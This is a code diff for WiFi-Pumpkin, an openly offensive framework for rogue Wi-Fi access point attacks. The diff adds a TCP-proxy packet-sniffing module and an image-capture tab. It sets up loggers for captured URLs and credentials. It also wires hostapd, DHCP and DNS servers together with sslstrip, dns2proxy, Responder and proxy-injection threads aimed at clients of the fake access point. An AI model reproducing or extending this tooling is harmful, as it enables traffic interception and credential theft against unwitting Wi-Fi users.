@@ -30,7 +30,7 @@ from core.utils import (
 )
 from core.widgets.tabmodels import (
     ProxySSLstrip,PumpkinMitmproxy,PumpkinMonitor,
-    PumpkinSettings
+    PumpkinSettings,PacketsSniffer,ImageCapture
 )
 
 from core.widgets.popupmodels import (
@@ -54,6 +54,7 @@ from core.packets.dhcpserver import DHCPServer,DNSServer
 from core.widgets.notifications import ServiceNotify
 from isc_dhcp_leases.iscdhcpleases import IscDhcpLeases
 from netfilterqueue import NetfilterQueue
+from core.servers.proxy.tcp.intercept import ThreadSniffingPackets
 
 """
 Description:
@@ -61,7 +62,7 @@ Description:
     for mount Access point.
 
 Copyright:
-    Copyright (C) 2015-2016 Marcos Nesster P0cl4bs Team
+    Copyright (C) 2015-2017 Marcos Nesster P0cl4bs Team
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
     the Free Software Foundation, either version 3 of the License, or
@@ -80,8 +81,8 @@ Copyright:
 author      = 'Marcos Nesster (@mh4x0f)  P0cl4bs Team'
 emails      = ['mh4root@gmail.com','p0cl4bs@gmail.com']
 license     = ' GNU GPL 3'
-version     = '0.8.4'
-update      = '22/12/2016' # This is Brasil :D
+version     = '0.8.5'
+update      = '04/05/2017' # This is Brasil :D
 desc        = ['Framework for Rogue Wi-Fi Access Point Attacks']
 
 class Initialize(QMainWindow):
@@ -150,6 +151,7 @@ class WifiPumpkin(QWidget):
     def __init__(self, parent = None,window=None,Fsettings=None):
         self.InitialMehtod = window
         super(WifiPumpkin, self).__init__(parent)
+        self.InternetShareWiFi = True # share internet options
 
         # check update from github repository
         self.Timer = waiterSleepThread()
@@ -167,6 +169,8 @@ class WifiPumpkin(QWidget):
         self.Tab_Default    = QWidget()
         self.Tab_Injector   = QWidget()
         self.Tab_PumpkinPro = QWidget()
+        self.Tab_Packetsniffer = QWidget()
+        self.Tab_imageCap   = QWidget()
         self.Tab_Settings   = QWidget()
         self.Tab_ApMonitor  = QWidget()
         self.Tab_Plugins    = QWidget()
@@ -212,6 +216,18 @@ class WifiPumpkin(QWidget):
         self.item_pumpkinProxy.setIcon(QIcon('icons/pumpkinproxy.png'))
         self.TabListWidget_Menu.addItem(self.item_pumpkinProxy)
 
+        self.item_packetsniffer = QListWidgetItem()
+        self.item_packetsniffer.setText('TCP-Proxy')
+        self.item_packetsniffer.setSizeHint(QSize(30,30))
+        self.item_packetsniffer.setIcon(QIcon('icons/tcpproxy.png'))
+        self.TabListWidget_Menu.addItem(self.item_packetsniffer)
+
+        self.item_imageCapture = QListWidgetItem()
+        self.item_imageCapture.setText('Images-Cap')
+        self.item_imageCapture.setSizeHint(QSize(30,30))
+        self.item_imageCapture.setIcon(QIcon('icons/image.png'))
+        self.TabListWidget_Menu.addItem(self.item_imageCapture)
+
         self.item_dock = QListWidgetItem()
         self.item_dock.setText('Activity-Monitor')
         self.item_dock.setSizeHint(QSize(30,30))
@@ -242,12 +258,16 @@ class WifiPumpkin(QWidget):
         self.ContentTabsettings= QVBoxLayout(self.Tab_Settings)
         self.ContentTabInject  = QVBoxLayout(self.Tab_Injector)
         self.ContentTabPumpPro = QVBoxLayout(self.Tab_PumpkinPro)
+        self.ContentTabPackets = QVBoxLayout(self.Tab_Packetsniffer)
+        self.ContentImageCap   = QHBoxLayout(self.Tab_imageCap)
         self.ContentTabMonitor = QVBoxLayout(self.Tab_ApMonitor)
         self.ContentTabPlugins = QVBoxLayout(self.Tab_Plugins)
         self.Stack.addWidget(self.Tab_Settings)
         self.Stack.addWidget(self.Tab_Plugins)
         self.Stack.addWidget(self.Tab_Injector)
         self.Stack.addWidget(self.Tab_PumpkinPro)
+        self.Stack.addWidget(self.Tab_Packetsniffer)
+        self.Stack.addWidget(self.Tab_imageCap)
         self.Stack.addWidget(self.Tab_dock)
         self.Stack.addWidget(self.Tab_ApMonitor)
 
@@ -258,12 +278,10 @@ class WifiPumpkin(QWidget):
             'HTTP-Requests': { # netcreds url requests
                 'active' : self.FSettings.Settings.get_setting('dockarea',
                 'dock_urlmonitor',format=bool),
-                'splitcode': ':[url]',
             },
             'HTTP-Authentication': { # netcreds passwords logins
                 'active' : self.FSettings.Settings.get_setting('dockarea',
                 'dock_credencials',format=bool),
-                'splitcode': ':[creds]',
             },
             'BDFProxy': { # plugins bdfproxy ouput
                 'active' : self.FSettings.Settings.get_setting('dockarea',
@@ -282,7 +300,7 @@ class WifiPumpkin(QWidget):
                 'dock_PumpkinProxy',format=bool),
             }
         }
-        self.ConfigTwin     = {
+        self.SettingsEnable     = {
         'ProgCheck':[],'AP_iface': None,'PortRedirect': None, 'interface':'None'}
         self.THeaders  = OrderedDict([ ('Devices',[]),('Mac Address',[]),('IP Address',[]),('Vendors',[])])
         # load all session saved in file ctg
@@ -291,7 +309,6 @@ class WifiPumpkin(QWidget):
         self.PopUpPlugins   = PopUpPlugins(self.FSettings,self) # create popupPlugins
         self.PopUpPlugins.sendSingal_disable.connect(self.get_disable_proxy_status)
         self.THReactor = ThreadReactor() # thread reactor for sslstrip
-        self.checkPlugins() # check plugins activated
         self.intGUI()
 
     def get_disable_proxy_status(self,status):
@@ -332,6 +349,16 @@ class WifiPumpkin(QWidget):
         self.PumpkinProxyTAB = PumpkinMitmproxy(main_method=self)
         self.ContentTabPumpPro.addLayout(self.PumpkinProxyTAB)
 
+    def TCPproxyTABContent(self):
+        ''' add Layout page PumpkinProxy in dashboard '''
+        self.PacketSnifferTAB = PacketsSniffer(main_method=self)
+        self.ContentTabPackets.addLayout(self.PacketSnifferTAB)
+
+    def ImageCaptureTABContent(self):
+        ''' add Layout page PumpkinProxy in dashboard '''
+        self.ImageCapTAB = ImageCapture(main_method=self)
+        self.ContentImageCap.addLayout(self.ImageCapTAB)
+
     def getContentTabDock(self,docklist):
         ''' get tab activated in Advanced mode '''
         self.dockAreaList = docklist
@@ -350,7 +377,9 @@ class WifiPumpkin(QWidget):
 
     def SettingsTABContent(self):
         ''' add Layout page Pump-settings in dashboard '''
-        self.PumpSettingsTAB = PumpkinSettings(None,self.slipt,self.AreaDockInfo,self.Tab_dock,self.FSettings)
+        widgets = {'SettingsAP': self.slipt, 'DockInfo': self.AreaDockInfo,
+        'Tab_dock': self.Tab_dock, 'Settings': self.FSettings,'Network': self.GroupAdapter}
+        self.PumpSettingsTAB = PumpkinSettings(None,widgets)
         self.PumpSettingsTAB.checkDockArea.connect(self.getContentTabDock)
         self.PumpSettingsTAB.sendMensage.connect(self.GetmessageSave)
         self.ContentTabsettings.addLayout(self.PumpSettingsTAB)
@@ -369,17 +398,18 @@ class WifiPumpkin(QWidget):
         self.StatusApname = QLabel('')
         self.StatusApchannel = QLabel('')
         self.proxy_lstatus = QLabel('[OFF]')
+        self.connected_status = QLabel('')
         self.StatusApname.setMaximumWidth(130)
 
         # add widgets in status bar
+        self.StatusBar.addWidget(QLabel('Connected:'))
+        self.StatusBar.addWidget(self.connected_status)
         self.StatusBar.addWidget(QLabel('SSID:'))
         self.StatusBar.addWidget(self.StatusApname)
         self.StatusBar.addWidget(QLabel('Channel:'))
         self.StatusBar.addWidget(self.StatusApchannel)
-        self.StatusBar.addWidget(QLabel("Access-Point:"))
+        self.StatusBar.addWidget(QLabel("Status-AP:"))
         self.StatusBar.addWidget(self.StatusDhcp)
-        self.StatusBar.addWidget(QLabel('Injector-Proxy:'))
-        self.StatusBar.addWidget(self.proxy_lstatus)
         self.StatusBar.addWidget(QLabel('Activate-Plugin:'))
         self.StatusBar.addWidget(self.status_plugin_proxy_name)
         self.set_proxy_scripts(False)
@@ -402,6 +432,7 @@ class WifiPumpkin(QWidget):
         self.EditChannel.setFixedWidth(50)
         self.EditApName.setFixedWidth(120)
         self.EditGateway.setFixedWidth(120)
+        self.EditGateway.setHidden(True) # disable Gateway
         self.selectCard = QComboBox(self)
         self.EditApName.textChanged.connect(self.setAP_name_changer)
         self.EditChannel.valueChanged.connect(self.setAP_channel_changer)
@@ -450,9 +481,10 @@ class WifiPumpkin(QWidget):
 
         # group for list network adapters
         self.GroupAdapter = QGroupBox()
-        self.layoutNetworkAd = QFormLayout()
+        self.layoutNetworkAd = QHBoxLayout()
         self.GroupAdapter.setTitle('Network Adapter')
-        self.layoutNetworkAd.addRow(self.selectCard,self.btrn_refresh)
+        self.layoutNetworkAd.addWidget(self.selectCard)
+        self.layoutNetworkAd.addWidget(self.btrn_refresh)
         self.GroupAdapter.setLayout(self.layoutNetworkAd)
 
         # settings info access point
@@ -461,7 +493,6 @@ class WifiPumpkin(QWidget):
         self.FormGroup3.addRow('Gateway:', self.EditGateway)
         self.FormGroup3.addRow('SSID:',    self.EditApName)
         self.FormGroup3.addRow('Channel:', self.EditChannel)
-        self.FormGroup3.addRow(self.GroupAdapter)
         self.GroupAP.setLayout(self.FormGroup3)
         self.GroupAP.setFixedWidth(260)
 
@@ -516,7 +547,7 @@ class WifiPumpkin(QWidget):
         self.donatelink = 'https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=PUPJEGHLJPFQL'
         self.donateLabel = ServiceNotify('Donations allow us to devote more time to the project so'
         ' if you are able to donate any amount. click ',title='Attention',
-        link=self.donatelink,timeout=15000)
+        link=self.donatelink,timeout=20000)
         # set main page Tool
         self.widget = QWidget()
         self.layout = QVBoxLayout(self.widget)
@@ -530,9 +561,12 @@ class WifiPumpkin(QWidget):
         self.DefaultTABContent()
         self.InjectorTABContent()
         self.PumpkinProxyTABContent()
+        self.TCPproxyTABContent()
+        self.ImageCaptureTABContent()
         self.SettingsTABContent()
         self.ApMonitorTabContent()
         self.PluginsTABContent()
+        self.checkPlugins() # check plugins activated
 
         self.myQMenuBar = QMenuBar(self)
         self.myQMenuBar.setFixedWidth(400)
@@ -778,8 +812,9 @@ class WifiPumpkin(QWidget):
 
     def checkPlugins(self):
         ''' check plugin options saved in file ctg '''
-        if self.FSettings.Settings.get_setting('plugins','netcreds_plugin',format=bool):
-            self.PopUpPlugins.check_netcreds.setChecked(True)
+        if self.FSettings.Settings.get_setting('plugins','tcpproxy_plugin',format=bool):
+            self.PopUpPlugins.check_tcpproxy.setChecked(True)
+        self.PopUpPlugins.checkBoxTCPproxy()
         if self.FSettings.Settings.get_setting('plugins','responder_plugin',format=bool):
             self.PopUpPlugins.check_responder.setChecked(True)
 
@@ -830,6 +865,14 @@ class WifiPumpkin(QWidget):
         else:
             self.proxy_lstatus.setText("[OFF]")
             self.proxy_lstatus.setStyleSheet("QLabel {  color : red; }")
+
+    def set_StatusConnected_Iface(self,bool,txt=''):
+        if bool:
+            self.connected_status.setText(txt)
+            self.connected_status.setStyleSheet("QLabel {  background-color: #996633; color : #000000; }")
+        else:
+            self.connected_status.setText('None')
+            self.connected_status.setStyleSheet("QLabel {  background-color: #808080; color : #000000; }")
 
     def StatusDHCPRequests(self,mac,user_info):
         ''' get HDCP request data and send for Tab monitor '''
@@ -938,7 +981,7 @@ class WifiPumpkin(QWidget):
         except Exception :pass
         self.EditApName.setText(self.FSettings.Settings.get_setting('accesspoint','ssid'))
         self.EditChannel.setValue(self.FSettings.Settings.get_setting('accesspoint','channel',format=int))
-        self.ConfigTwin['PortRedirect'] = self.FSettings.redirectport.text()
+        self.SettingsEnable['PortRedirect'] = self.FSettings.redirectport.text()
 
         # get all Wireless Adapter available and add in comboBox
         interfaces = self.get_interfaces['all']
@@ -947,6 +990,13 @@ class WifiPumpkin(QWidget):
             if search('wl', iface):
                 wireless.append(iface)
         self.selectCard.addItems(wireless)
+
+        if  self.get_interfaces['activated'][0]:
+            self.set_StatusConnected_Iface(True,self.get_interfaces['activated'][0])
+        else:
+            self.InternetShareWiFi = False
+            self.set_StatusConnected_Iface(False,'')
+
         interface = self.FSettings.Settings.get_setting('accesspoint','interfaceAP')
         if interface != 'None' and interface in self.get_interfaces['all']:
             self.selectCard.setCurrentIndex(wireless.index(interface))
@@ -957,7 +1007,7 @@ class WifiPumpkin(QWidget):
         hostapd = popen('which hostapd').read().split("\n")
         xterm = popen('which xterm').read().split("\n")
         lista = [ '', '',driftnet[0],dhcpd[0],'',hostapd[0],xterm[0]]
-        for i in lista:self.ConfigTwin['ProgCheck'].append(path.isfile(i))
+        for i in lista:self.SettingsEnable['ProgCheck'].append(path.isfile(i))
 
 
     def refrash_interface(self):
@@ -977,10 +1027,6 @@ class WifiPumpkin(QWidget):
         self.SessionsAP[self.currentSessionID]['stoped'] = asctime()
         self.FSettings.Settings.set_setting('accesspoint','sessions',dumps(self.SessionsAP))
         # check if dockArea activated and stop dock Area
-        if hasattr(self,'dockAreaList'):
-            for dock in self.dockAreaList.keys():
-                self.dockAreaList[dock].clear()
-                self.dockAreaList[dock].stopProcess()
         self.PumpSettingsTAB.GroupArea.setEnabled(True)
         # stop all Thread in create for Access Point
         try:
@@ -993,10 +1039,12 @@ class WifiPumpkin(QWidget):
         # remove iptables commands and stop dhcpd if pesist in process
         for kill in self.SettingsAP['kill']:
             Popen(kill.split(), stdout=PIPE,shell=False,stderr=PIPE)
+        #disabled options
         # check if persistent option in Settigs is enable
-        if not self.FSettings.Settings.get_setting('accesspoint','persistNetwokManager',format=bool):
-            Refactor.settingsNetworkManager(self.ConfigTwin['AP_iface'],Remove=True)
-        set_monitor_mode(self.ConfigTwin['AP_iface']).setDisable()
+        #if not self.FSettings.Settings.get_setting('accesspoint','persistNetwokManager',format=bool):
+        #    Refactor.settingsNetworkManager(self.SettingsEnable['AP_iface'],Remove=True)
+
+        set_monitor_mode(self.SettingsEnable['AP_iface']).setDisable()
         self.Started(False)
         self.progress.setValue(1)
         self.progress.change_color('')
@@ -1024,7 +1072,6 @@ class WifiPumpkin(QWidget):
             self.FormPopup.Ftemplates.killThread()
             self.FormPopup.StatusServer(False)
         self.EditApName.setEnabled(True)
-        self.EditGateway.setEnabled(True)
         self.selectCard.setEnabled(True)
         self.EditChannel.setEnabled(True)
         self.GroupApPassphrase.setEnabled(True)
@@ -1032,30 +1079,33 @@ class WifiPumpkin(QWidget):
         self.PopUpPlugins.tableplugins.setEnabled(True)
         self.PopUpPlugins.tableplugincheckbox.setEnabled(True)
         self.btn_cancelar.setEnabled(False)
+        self.progress.showProcessBar()
 
     def delete_logger(self):
         ''' delete all logger file in logs/ '''
         content = Refactor.exportHtml()
-        if listdir('logs')!= '':
-            resp = QMessageBox.question(self, 'About Delete Logger',
-                'do you want to delete logs?',QMessageBox.Yes |
-                    QMessageBox.No, QMessageBox.No)
-            if resp == QMessageBox.Yes:
-                Popen(['rm','logs/Caplog/*.cap'], stdout=PIPE,shell=False,stderr=PIPE)
-                for keyFile in content['Files']:
-                    with open(keyFile,'w') as f:
-                        f.write(''),f.close()
-                self.FSettings.Settings.set_setting('accesspoint','sessions',dumps({}))
-                QMessageBox.information(self,'Logger','All Looger::Output has been Removed...')
+        resp = QMessageBox.question(self, 'About Delete Logger',
+            'do you want to delete logs?',QMessageBox.Yes |
+                QMessageBox.No, QMessageBox.No)
+        if resp == QMessageBox.Yes:
+            Popen(['rm','logs/Caplog/*.cap'], stdout=PIPE,shell=False,stderr=PIPE)
+            if len(listdir('logs/ImagesCap')) != 1:
+                Popen(['rm', 'logs/ImagesCap/*.png'], stdout=PIPE, shell=False, stderr=PIPE)
+                Popen(['rm', 'logs/ImagesCap/*.jpg'], stdout=PIPE, shell=False, stderr=PIPE)
+            for keyFile in content['Files']:
+                with open(keyFile,'w') as f:
+                    f.write(''),f.close()
+            self.FSettings.Settings.set_setting('accesspoint','sessions',dumps({}))
+            QMessageBox.information(self,'Logger','All Looger::Output has been Removed...')
 
 
     def start_dift(self):
         ''' start tool driftnet in Thread '''
-        if self.ConfigTwin['ProgCheck'][2]:
-            if self.ConfigTwin['ProgCheck'][6]:
+        if self.SettingsEnable['ProgCheck'][2]:
+            if self.SettingsEnable['ProgCheck'][6]:
                 if self.FSettings.Settings.get_setting('accesspoint','statusAP',format=bool):
                     Thread_driftnet = ThreadPopen(['driftnet', '-i',
-                    self.ConfigTwin['AP_iface'],'-d','./logs/Tools/Driftnet/',])
+                    self.SettingsEnable['AP_iface'],'-d','./logs/Tools/Driftnet/',])
                     Thread_driftnet.setObjectName('Tool::Driftnet')
                     self.Apthreads['RougeAP'].append(Thread_driftnet)
                     return Thread_driftnet.start()
@@ -1066,16 +1116,14 @@ class WifiPumpkin(QWidget):
 
     def CoreSettings(self):
         ''' configure interface and dhcpd for mount Access Point '''
-        self.splitcodeURL = self.AreaDockInfo['HTTP-Requests']['splitcode']
-        self.splitcodeCRED = self.AreaDockInfo['HTTP-Authentication']['splitcode']
         self.DHCP = self.PumpSettingsTAB.getPumpkinSettings()
-        self.ConfigTwin['PortRedirect'] = self.FSettings.Settings.get_setting('settings','redirect_port')
+        self.SettingsEnable['PortRedirect'] = self.FSettings.Settings.get_setting('settings','redirect_port')
         self.SettingsAP = {
         'interface':
             [
-                'ifconfig %s up'%(self.ConfigTwin['AP_iface']),
-                'ifconfig %s %s netmask %s'%(self.ConfigTwin['AP_iface'],self.DHCP['router'],self.DHCP['netmask']),
-                'ifconfig %s mtu 1400'%(self.ConfigTwin['AP_iface']),
+                'ifconfig %s up'%(self.SettingsEnable['AP_iface']),
+                'ifconfig %s %s netmask %s'%(self.SettingsEnable['AP_iface'],self.DHCP['router'],self.DHCP['netmask']),
+                'ifconfig %s mtu 1400'%(self.SettingsEnable['AP_iface']),
                 'route add -net %s netmask %s gw %s'%(self.DHCP['subnet'],
                 self.DHCP['netmask'],self.DHCP['router'])
             ],
@@ -1085,7 +1133,7 @@ class WifiPumpkin(QWidget):
                 'iptables --table nat --flush',
                 'iptables --delete-chain',
                 'iptables --table nat --delete-chain',
-                'ifconfig %s 0'%(self.ConfigTwin['AP_iface']),
+                'ifconfig %s 0'%(self.SettingsEnable['AP_iface']),
                 'killall dhpcd',
             ],
         'hostapd':
@@ -1110,7 +1158,7 @@ class WifiPumpkin(QWidget):
             ],
         'dnsmasq':
             [
-                'interface=%s\n'%(self.ConfigTwin['AP_iface']),
+                'interface=%s\n'%(self.SettingsEnable['AP_iface']),
                 'dhcp-range=10.0.0.1,10.0.0.50,12h\n',
                 'dhcp-option=3, 10.0.0.1\n',
                 'dhcp-option=6, 10.0.0.1\n',
@@ -1141,7 +1189,7 @@ class WifiPumpkin(QWidget):
         if not path.isfile(self.hostapd_path):
             return QMessageBox.information(self,'Error Hostapd','hostapd is not installed')
         if self.FSettings.Settings.get_setting('accesspoint','dhcpd_server',format=bool):
-            if not self.ConfigTwin['ProgCheck'][3]:
+            if not self.SettingsEnable['ProgCheck'][3]:
                 return QMessageBox.warning(self,'Error dhcpd','isc-dhcp-server (dhcpd) is not installed')
         return True
 
@@ -1198,10 +1246,6 @@ class WifiPumpkin(QWidget):
 
         # check connection with internet
         self.interfacesLink = Refactor.get_interfaces()
-        if len(self.EditGateway.text()) == 0 or self.interfacesLink['activated'][0] == None:
-            return QMessageBox.warning(self,'Internet Connection','No internet connection not found, '
-            'sorry WiFi-Pumpkin tool requires an internet connection to mount MITM attack. '
-            'check your connection and try again')
 
         # check if Wireless interface is being used
         if str(self.selectCard.currentText()) == self.interfacesLink['activated'][0]:
@@ -1213,15 +1257,6 @@ class WifiPumpkin(QWidget):
                     ' : Device or resource busy\n{}\nYou may need to another Wi-Fi USB Adapter'
                     ' for create AP or try use with local connetion(Ethernet).'.format(
                     str(self.selectCard.currentText()),line))
-
-        # check if kali linux is using wireless interface for share internet
-        if  self.interfacesLink['activated'][1] == 'wireless' and dist()[0] == 'Kali':
-            return QMessageBox.information(self,'Network Information',
-            "The Kali Linux don't have support to use with 2 wireless"
-            "(1 for connected internet/2 for WiFi-Pumpkin AP)."
-            " because does not exclude correctly "
-            "adapter in '/etc/NetworkManager/NetworkManager.conf'.\n\n"
-            "( if you have any solution for this send me feedback ).")
 
         # check if range ip class is same
         dh, gateway = self.PumpSettingsTAB.getPumpkinSettings()['router'],str(self.EditGateway.text())
@@ -1249,11 +1284,21 @@ class WifiPumpkin(QWidget):
         self.SessionsAP[self.currentSessionID]['started'] = asctime()
         print('[*] Current Session::ID [{}]'.format(self.currentSessionID))
 
+        # clear before session
+        if hasattr(self,'dockAreaList'):
+            for dock in self.dockAreaList.keys():
+                self.dockAreaList[dock].clear()
+                self.dockAreaList[dock].stopProcess()
+        self.PumpkinProxyTAB.tableLogging.clearContents()
+        self.ImageCapTAB.TableImage.clear()
+        self.ImageCapTAB.TableImage.setRowCount(0)
+
         # check if using ethernet or wireless connection
         print('[*] Configuring hostapd...')
-        self.ConfigTwin['AP_iface'] = str(self.selectCard.currentText())
-        set_monitor_mode(self.ConfigTwin['AP_iface']).setDisable()
-        if self.interfacesLink['activated'][1] == 'ethernet' or self.interfacesLink['activated'][1] == 'ppp':
+        self.SettingsEnable['AP_iface'] = str(self.selectCard.currentText())
+        set_monitor_mode(self.SettingsEnable['AP_iface']).setDisable()
+        if self.interfacesLink['activated'][1] == 'ethernet' or self.interfacesLink['activated'][1] == 'ppp' \
+                or self.interfacesLink['activated'][0] == None: #allow use without internet connection
             # change Wi-Fi state card
             Refactor.kill_procInterfaceBusy() # killing network process
             try:
@@ -1265,11 +1310,12 @@ class WifiPumpkin(QWidget):
                     return QMessageBox.warning(self,'Error nmcli',str(error))
             finally:
                 call(['rfkill', 'unblock' ,'wifi'])
-        elif self.interfacesLink['activated'][1] == 'wireless':
-            # exclude USB wireless adapter in file NetworkManager
-            if not Refactor.settingsNetworkManager(self.ConfigTwin['AP_iface'],Remove=False):
-                return QMessageBox.warning(self,'Network Manager',
-                'Not found file NetworkManager.conf in folder /etc/NetworkManager/')
+
+        #elif self.interfacesLink['activated'][1] == 'wireless':
+        #    # exclude USB wireless adapter in file NetworkManager
+        #    if not Refactor.settingsNetworkManager(self.SettingsEnable['AP_iface'],Remove=False):
+        #        return QMessageBox.warning(self,'Network Manager',
+        #        'Not found file NetworkManager.conf in folder /etc/NetworkManager/')
 
         # create dhcpd.leases and set permission for acesss DHCPD
         leases = '/var/lib/dhcp/dhcpd.leases'
@@ -1304,7 +1350,6 @@ class WifiPumpkin(QWidget):
         # disable options when started AP
         self.btn_start_attack.setDisabled(True)
         self.EditApName.setEnabled(False)
-        self.EditGateway.setEnabled(False)
         self.selectCard.setEnabled(False)
         self.EditChannel.setEnabled(False)
         self.GroupApPassphrase.setEnabled(False)
@@ -1317,26 +1362,28 @@ class WifiPumpkin(QWidget):
         print('[*] Configuring dhcpd...')
         if  self.FSettings.Settings.get_setting('accesspoint','dhcpd_server',format=bool):
             self.Thread_dhcp = ThRunDhcp(['dhcpd','-d','-f','-lf','/var/lib/dhcp/dhcpd.leases','-cf',
-            '/etc/dhcp/dhcpd.conf',self.ConfigTwin['AP_iface']],self.currentSessionID)
+            '/etc/dhcp/dhcpd.conf',self.SettingsEnable['AP_iface']],self.currentSessionID)
             self.Thread_dhcp.sendRequest.connect(self.GetDHCPRequests)
             self.Thread_dhcp.setObjectName('DHCP')
             self.Apthreads['RougeAP'].append(self.Thread_dhcp)
             self.PopUpPlugins.checkGeneralOptions() # check rules iptables
 
         elif self.FSettings.Settings.get_setting('accesspoint','pydhcp_server',format=bool):
-            #self.ThreadDNSServer = DNSServer(self.ConfigTwin['AP_iface'],self.DHCP['router'])
-            #self.ThreadDNSServer.setObjectName('DNSServer')
-            # I change DNSServer for dns2proxy for now.
-            self.ThreadDNSServer = ProcessThread({'python':['plugins/external/dns2proxy/dns2proxy.py','-i',
-            str(self.selectCard.currentText()),'-k',self.currentSessionID]})
-            self.ThreadDNSServer._ProcssOutput.connect(self.get_dns2proxy_output)
-            self.ThreadDNSServer.setObjectName('DNSServer')
+            if self.FSettings.Settings.get_setting('accesspoint','pydns_server',format=bool):
+                self.ThreadDNSServer = DNSServer(self.SettingsEnable['AP_iface'],self.DHCP['router'])
+                self.ThreadDNSServer.setObjectName('DNSServer') # use DNS python implements
+
+            elif self.FSettings.Settings.get_setting('accesspoint','dnsproxy_server',format=bool):
+                self.ThreadDNSServer = ProcessThread({'python':['plugins/external/dns2proxy/dns2proxy.py','-i',
+                str(self.selectCard.currentText()),'-k',self.currentSessionID]})
+                self.ThreadDNSServer._ProcssOutput.connect(self.get_dns2proxy_output)
+                self.ThreadDNSServer.setObjectName('DNSServer') # use dns2proxy as DNS server
 
             if not self.PopUpPlugins.check_dns2proy.isChecked():
                 self.Apthreads['RougeAP'].append(self.ThreadDNSServer)
                 #self.PopUpPlugins.set_Dns2proxyRule() # disabled :: redirect UDP port 53
 
-            self.ThreadDHCPserver = DHCPServer(self.ConfigTwin['AP_iface'],self.DHCP)
+            self.ThreadDHCPserver = DHCPServer(self.SettingsEnable['AP_iface'],self.DHCP)
             self.ThreadDHCPserver.sendConnetedClient.connect(self.GetDHCPDiscoverInfo)
             self.ThreadDHCPserver.setObjectName('DHCPServer')
             self.Apthreads['RougeAP'].append(self.ThreadDHCPserver)
@@ -1358,12 +1405,16 @@ class WifiPumpkin(QWidget):
             if not self.THReactor.isRunning():
                 self.THReactor.start()
 
-        if self.PopUpPlugins.check_netcreds.isChecked():
-            self.Thread_netcreds = ProcessThread({'python':['plugins/external/net-creds/net-creds.py','-i',
-            str(self.selectCard.currentText()),'-k',self.currentSessionID]})
-            self.Thread_netcreds._ProcssOutput.connect(self.get_netcreds_output)
-            self.Thread_netcreds.setObjectName('Net-Creds')
-            self.Apthreads['RougeAP'].append(self.Thread_netcreds)
+        #create logging for somes threads
+        setup_logger('pumpkinproxy', 'logs/AccessPoint/pumpkin-proxy.log', self.currentSessionID)
+        setup_logger('urls_capture', 'logs/AccessPoint/urls.log', self.currentSessionID)
+        setup_logger('creds_capture', 'logs/AccessPoint/credentials.log', self.currentSessionID)
+        setup_logger('tcp_proxy', 'logs/AccessPoint/tcp-proxy.log', self.currentSessionID)
+        self.LogPumpkinproxy    = getLogger('pumpkinproxy')
+        self.LogUrlMonitor      = getLogger('urls_capture')
+        self.LogCredsMonitor    = getLogger('creds_capture')
+        self.LogTcpproxy        = getLogger('tcp_proxy')
+
 
         if self.PopUpPlugins.check_responder.isChecked():
             # create thread for plugin responder
@@ -1384,14 +1435,14 @@ class WifiPumpkin(QWidget):
             self.Apthreads['RougeAP'].append(self.Thread_dns2proxy)
 
             # create thread for plugin SSLstrip
-            self.Threadsslstrip = Thread_sslstrip(self.ConfigTwin['PortRedirect'],
+            self.Threadsslstrip = Thread_sslstrip(self.SettingsEnable['PortRedirect'],
             self.plugins,self.ProxyPluginsTAB._PluginsToLoader,self.currentSessionID)
             self.Threadsslstrip.setObjectName("sslstrip2")
             self.Apthreads['RougeAP'].append(self.Threadsslstrip)
 
         elif self.PopUpPlugins.check_sergioProxy.isChecked():
             # create thread for plugin Sergio-proxy
-            self.Threadsslstrip = Thread_sergioProxy(self.ConfigTwin['PortRedirect'],
+            self.Threadsslstrip = Thread_sergioProxy(self.SettingsEnable['PortRedirect'],
             self.plugins,self.ProxyPluginsTAB._PluginsToLoader,self.currentSessionID)
             self.Threadsslstrip.setObjectName("sslstrip")
             self.Apthreads['RougeAP'].append(self.Threadsslstrip)
@@ -1406,33 +1457,40 @@ class WifiPumpkin(QWidget):
 
         elif self.PopUpPlugins.check_pumpkinProxy.isChecked():
             # create thread for plugin Pumpkin-Proxy
-            setup_logger('pumpkinproxy', 'logs/AccessPoint/pumpkin-proxy.log',self.currentSessionID)
             self.Thread_PumpkinProxy = ThreadPumpkinProxy(self.currentSessionID)
             self.Thread_PumpkinProxy.send.connect(self.get_PumpkinProxy_output)
             self.Thread_PumpkinProxy.setObjectName('Pumpkin-Proxy')
             self.Apthreads['RougeAP'].append(self.Thread_PumpkinProxy)
-            self.LogPumpkinproxy = getLogger('pumpkinproxy')
 
+        # start thread TCPproxy Module
+        if self.PopUpPlugins.check_tcpproxy.isChecked():
+            self.Thread_TCPproxy = ThreadSniffingPackets(str(self.selectCard.currentText()),self.currentSessionID)
+            self.Thread_TCPproxy.setObjectName('TCPProxy')
+            self.Thread_TCPproxy.output_plugins.connect(self.get_TCPproxy_output)
+            self.Apthreads['RougeAP'].append(self.Thread_TCPproxy)
+
+        if self.InternetShareWiFi:
+            print('[*] Sharing Internet Connections with NAT...')
         iptables = []
         # get all rules in settings->iptables
         for index in xrange(self.FSettings.ListRules.count()):
            iptables.append(str(self.FSettings.ListRules.item(index).text()))
         for rulesetfilter in iptables:
-            if '$inet' in rulesetfilter:
-                rulesetfilter = rulesetfilter.replace('$inet',str(Refactor.get_interfaces()['activated'][0]))
-            if '$wlan' in rulesetfilter:
-                rulesetfilter = rulesetfilter.replace('$wlan',self.ConfigTwin['AP_iface'])
-            popen(rulesetfilter)
-        print('[*] Sharing Internet Connections with NAT...')
+            if self.InternetShareWiFi: # disable share internet from network
+                if '$inet' in rulesetfilter:
+                    rulesetfilter = rulesetfilter.replace('$inet',str(Refactor.get_interfaces()['activated'][0]))
+                if '$wlan' in rulesetfilter:
+                    rulesetfilter = rulesetfilter.replace('$wlan',self.SettingsEnable['AP_iface'])
+            if not ('$inet' in rulesetfilter or 'wlan' in rulesetfilter):
+                popen(rulesetfilter)
 
         # start all Thread in sessions
-        self.progress.change_color('#FFA500')
         for thread in self.Apthreads['RougeAP']:
             self.progress.update_bar_simple(20)
             QThread.sleep(1)
             thread.start()
         self.progress.setValue(100)
-        self.progress.change_color('#FFA500')
+        self.progress.hideProcessbar()
         # check if Advanced mode is enable
         if self.FSettings.Settings.get_setting('dockarea','advanced',format=bool):
             self.PumpSettingsTAB.doCheckAdvanced()
@@ -1443,15 +1501,6 @@ class WifiPumpkin(QWidget):
         self.selectCard.currentText()),self.EditChannel.value()))
         self.FSettings.Settings.set_setting('accesspoint','ssid',str(self.EditApName.text()))
         self.FSettings.Settings.set_setting('accesspoint','channel',str(self.EditChannel.value()))
-
